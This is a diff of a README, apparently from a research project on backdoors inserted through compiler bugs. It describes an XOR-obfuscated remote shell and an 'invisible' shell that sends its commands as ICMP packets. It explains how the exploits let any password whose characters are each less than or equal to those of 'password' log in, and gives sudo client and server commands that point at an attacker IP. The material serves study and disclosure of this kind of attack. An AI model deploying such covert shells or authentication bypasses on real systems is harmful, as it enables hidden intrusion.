@@ -41,14 +41,8 @@ There are two types of shells: one is a secure shell which uses repeated
 xor with the number 42 (see https://linux.die.net/man/3/memfrob) and the
 other is an 'invisible' shell which transmits the commands as ICMP packets.
 
-By default, the shell I exploited using compiler bugs is the secure shell. I implemented a minimal authentication system having username **admin** and password **password**. The way this shell should be used is as follows:
-
-1. After you build one of the Docker containers associated with a bug, clone the repo inside the container.
-2. cd CompilerBackdoors/RemoteShell
 1. Build using ** make all **
-2. ./remote_shell_exe s <port>   (i.e. the server)
-   ./remote_shell_exe c <target ip>  <port> (i.e. the client. Note that you can try it locally. In this case the attacker ip is 127.0.0.1)
-3. You will be prompted to enter the username (followed by enter) and a password (followed by enter).
-4. All exploits have been designed to provide access to the server for any supplied password P=c1 c2 c3....c8, where
-[ci <= p | p <- "password"].
-5. When you run the secure shell on a machine with a good compiler version, you should only be able to authenticate when the introduced password is "password".
+2. sudo ./remote_shell_exe c <attacker ip> (i.e. the client)
+   sudo ./remote_shell_exe s <target ip>   (i.e. the server)
+3. To check that the commands the client sends are ICMP packets:
+   sudo tcpdump -nnXSs 0 -i lo icmp
